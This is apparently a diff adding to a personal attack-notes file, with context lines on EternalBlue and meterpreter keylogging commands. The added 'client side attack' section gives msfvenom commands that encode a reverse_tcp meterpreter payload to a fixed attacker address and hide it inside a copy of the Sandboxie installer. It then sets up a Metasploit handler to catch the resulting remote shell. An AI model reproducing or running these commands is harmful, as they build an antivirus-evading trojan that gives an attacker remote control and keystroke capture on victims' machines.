@@ -44,3 +44,21 @@ git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
 30.- screengrab
 31.- keyscan_start
 32.- keyscan_dump
+
+
+
+client side attack
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.151.189 LPORT=8888 -e x86/shikata_ga_nai -i 10 -f raw > eoncode.bin
+
+msfvenom -p - -x SandboxieInstall.exe -k -f exe -a x86 --platform windows -e x86/bloxor -i 2 > sanbox.exe < eoncode.bin
+
+msf > use exploit/multi/handler
+msf > set payload windows/meterpreter/reverse_tcp
+msf > set lhost 192.168.151.189
+msf > set lport 8888
+msf > run
+
+
+
+
